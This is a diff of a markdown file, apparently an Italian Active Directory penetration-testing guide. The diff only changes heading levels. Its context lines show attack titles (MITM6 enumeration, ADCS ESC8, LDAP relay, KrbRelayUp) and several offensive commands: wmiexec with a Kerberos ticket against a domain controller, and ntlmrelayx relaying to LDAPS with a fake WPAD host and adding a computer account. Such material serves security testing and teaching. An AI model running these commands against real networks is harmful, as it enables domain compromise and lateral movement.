@@ -53,7 +53,7 @@ KRB5CCNAME=Administrator.ccache python3 wmiexec.py -k -no-pass @FQDN DC1
 ```
 
 -----------------
-#### Attacco 2. Enumerazione AD da non autenticato sfruttando MITM6 🕵
+### Attacco 2. Enumerazione AD da non autenticato sfruttando MITM6 🕵
 
 #### Teoria
 
@@ -84,10 +84,10 @@ impacket-ntlmrelayx -6 -t ldaps://<DC-IP> -wh fakewpad.adlab.com -l loot
 ```
 
 -----------------
-#### Attacco 3. Sfruttamento ESC 8 ADCS 🔓🧑🏼‍💻
+### Attacco 3. Sfruttamento ESC 8 ADCS 🔓🧑🏼‍💻
 
 -----------------
-#### Attacco 4. LDAP signing not required and LDAP channel binding disabled 🔓🧑🏼‍💻
+### Attacco 4. LDAP signing not required and LDAP channel binding disabled 🔓🧑🏼‍💻
 
 #### Prerequisiti
 
@@ -106,7 +106,7 @@ sudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer
 ```
 
 -----------------
-#### Attacco 5. KrbRelayUp Kerberos Relay Attack with RBCD method 🔓🧑🏼‍💻
+### Attacco 5. KrbRelayUp Kerberos Relay Attack with RBCD method 🔓🧑🏼‍💻
 
 #### Teoria
 KrbRelayUp è un wrapper che avvolge alcune delle funzionalità di Rubeus e KrbRelay (insieme ad alcuni altri strumenti) al fine di semplificare l'abuso della seguente primitiva di attacco:
